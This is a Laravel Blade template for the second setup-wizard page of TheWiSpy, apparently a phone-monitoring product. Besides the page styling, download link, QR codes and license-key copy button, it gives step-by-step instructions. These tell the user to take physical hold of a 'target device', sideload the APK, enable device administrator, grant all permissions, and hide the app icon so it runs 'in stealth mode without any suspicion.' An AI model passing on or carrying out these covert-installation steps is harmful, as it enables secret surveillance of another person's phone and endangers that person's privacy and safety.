@extends('layouts.user')
@section('pageTitle', 'Dashboard for Remote Mobile Monitoring') 
@section('content')
<style>
	.purchase-progress {
    background: #F1F2F2;
    padding: 15px 0;
	overflow:hidden;
	margin-bottom:25px; border-radius:4px;
	
}
.purchase-progress .wrapper {
    width: 570px;
    margin: 0 auto;
}
.purchase-progress .item.active {
    background: #ec008c;
    color: #fff;
}
.purchase-progress .item {
    float: left;
width: 32px;
line-height: 30px;
background: #fff;
border: 2px solid #ec008c;
border-radius: 50%;
text-align: center;
color: #333;
font-size: 17px;
}
.purchase-progress .line-cut {
    float: left;
    width: 235px;
    height: 2px;
    background: #ec008c;
    position: relative;
    top: 15px;
}
.clear:after {
    display: block;
    clear: both;
}
.setup_wizard_content h3 {font-size:16px; font-weight:bold; text-align:center}
.col-md-6.center-sec {
    text-align: center;
}
.down-height {
    min-height: 45px;
}
.download-button {
    margin-bottom: 25px;
}

.setup_wizard_installation{margin-top:20px;}//add
</style>
	<div class="row">
		<div class="col-md-12 col-lg-12 col-sm-12 col-xs-12">
			<div class="white-box">
				<div class="purchase-progress clear">
<div class="wrapper">
<div class="item active">1</div>
<div class="line-cut"></div>
<div class="item active">2</div>
<div class="line-cut"></div>
<div class="item ">3</div>
</div>
</div>
	<div class="setup_wizard_content">
					
<div class="download-app desktop">


	<div class="download-section">
		<div class="col-md-12 col-md-6 center-sec left"> 
	<p class="download-button"><strong>Download your App Form Here:</strong></p>
	<div class="down-height">
						<a href="http://download.thewispy.com/" class="app-download-link">Download App Now
						</a></div>

<h2>OR</h2>


<div class="next-qr">
	
		<p><strong>Scan this QrCode to Download App</strong>  </p>
					{!! QrCode::generate('https://download.thewispy.com/'); !!}
					<!-- <div class="heading-spliting"><h1>Use the Key to Activate your App</h1></div> -->
	
</div>

						</div>
</div> 
	<!-- <div class="col-md-4 center-sec"></div> -->

</div>

<div class="download-license desktop	">
				<div class="col-md-12 col-md-6 center-sec right"> 
						<p>
							<strong>You can use License Key<br>
								<button style="margin-right: 0px" onclick="copyToClipboard('#myInput')">Press to Copy License Key</button>

								<span style="background: #ec008c;border-radius: 10px;color: #fff;font-size: 16px;display: inline-block;border: 1px solid #ec008c;text-align: center;margin-top: 10px;margin-bottom: 10px; padding:10px" id="myInput">
									{{$clientlist->uniqueid}}
								</span>
								
							</strong>
						</p>

<h2>OR</h2>



					<p><strong>Scan this QrCode to Copy License Key</strong>  </p>
					{!! QrCode::generate($clientlist->uniqueid); !!}


				</div>


	<!-- <div class="col-md-4 center-sec">
	</div> -->
		


				
			</div>
<div class="setup_wizard_installation">
	<h3>Installation of TheWiSpy App</h3>
	<ul id="tutorail-list">
					<li>
						 From the Set-Up Wizard page, you will get the app download link. Now, you require access to the target device physically for app installation. Once you have the target phone in your hand, open the app download link on it. Slide right to start downloading the app. Once the downloading gets completed, a notification will appear showing the APK file. You can open the file via a pop-up window or from the download folder of the target device. Tap on “Install” and then “Open” it to start the app.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-download-link.png" />
					<li>
						From the Set-Up Wizard page, you will get the app download link. Now, you require access to the target device physically for app installation. Once you have the target phone in your hand, open the app download link on it. Slide right to start downloading the app. Once the downloading gets completed, a notification will appear showing the APK file. You can open the file via a pop-up window or from the download folder of the target device. Tap on “Install” and then “Open” it to start the app.
					</li>
					<li>
						 Once you launch or open TheWiSpy application, you must carefully read and acknowledge the “Privacy Policy” and EULA. After accepting the terms and conditions of TheWiSpy, enter the license key to activate the application.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-privacy-and-eula.png" />
					<li>
						Please “Enter the child name” and “Age” and click next. Now click “Proceed to settings” and Turn “On” Google services in data usage access.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-child-information-and-data-usage.png" />
					<li>
						 Once done, follow the Setup Wizard to complete the app configuration on your target device.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-allow-data-usage-access.png" />
					<li>
						 Click next. Open “device administrator” and activate it.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-activate-device-administrator.png" />
					<li>
						Please make sure that you allow all the permission requests for the app installation.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-allow-permission-request.png" />
					<li>
						 NOTE: *Please make sure you allow all permissions.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-allow-permissions-request.png" />
					<li>
						 After installing TheWiSpy in your target Android phone, you can hide the app icon.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-hide-app-icon.png" />
					<li>
						TheWiSpy icon will not be shown in the app list once you remove the app icon from the settings menu. TheWiSpy app will completely function at stealth mode without any suspicion.
					</li>
				</ul>
</div>			
	</div>
	<div class="next_step_btn">
		<a class="next_step_btn_anchor" href="{{url('/setup-wizard-1').'/'.$id}}">Back</a>
		<a class="next_step_btn_anchor" href="{{url('/setup-wizard-3').'/'.$id}}">Next</a>

	</div>
		</div>
	</div>
	</div>
@endsection
@section('scripts')
	<script type="text/javascript">
	
	function copyToClipboard(element) {
  var $temp = $("<input>");
  $("body").append($temp);
  $temp.val($(element).text()).select();
  document.execCommand("copy");
  $temp.remove();
}


	</script>
@endsection